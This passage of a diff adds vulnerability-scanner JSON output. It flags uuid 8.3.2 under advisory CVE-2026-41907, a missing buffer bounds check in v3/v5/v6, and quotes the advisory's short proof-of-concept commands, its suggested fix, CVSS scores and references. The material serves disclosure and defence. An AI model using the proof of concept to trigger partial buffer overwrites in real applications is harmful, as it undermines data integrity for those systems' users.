+                "github_reviewed": true,
+                "github_reviewed_at": "2026-04-22T20:53:24Z",
+                "nvd_published_at": "2026-04-24T19:17:14Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-w5hq-g745-h8pq"
+              ],
+              "aliases": [
+                "CVE-2026-41907",
+                "GHSA-w5hq-g745-h8pq"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "uuid",
+            "version": "8.3.2",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2026-05-21T18:30:08Z",
+              "published": "2026-04-22T20:53:24Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-w5hq-g745-h8pq",
+              "aliases": [
+                "CVE-2026-41907"
+              ],
+              "related": [
+                "CGA-cfw7-cq6w-m5hj"
+              ],
+              "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+              "details": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=\u003ev4({},new Uint8Array(8),4)],\n  ['v5()',()=\u003ev5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=\u003ev6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset \u003c 0 || offset + 16 \u003e buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "11.1.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "12.0.0"
+                        },
+                        {
+                          "fixed": "12.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "13.0.0"
+                        },
+                        {
+                          "fixed": "13.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41907"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/uuidjs/uuid"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v11.1.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v12.0.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v13.0.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v14.0.0"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1285",
+                  "CWE-787"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-04-22T20:53:24Z",
+                "nvd_published_at": "2026-04-24T19:17:14Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-w5hq-g745-h8pq"
+              ],
+              "aliases": [
+                "CVE-2026-41907",
+                "GHSA-w5hq-g745-h8pq"
+              ],
+              "max_severity": "7.5"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
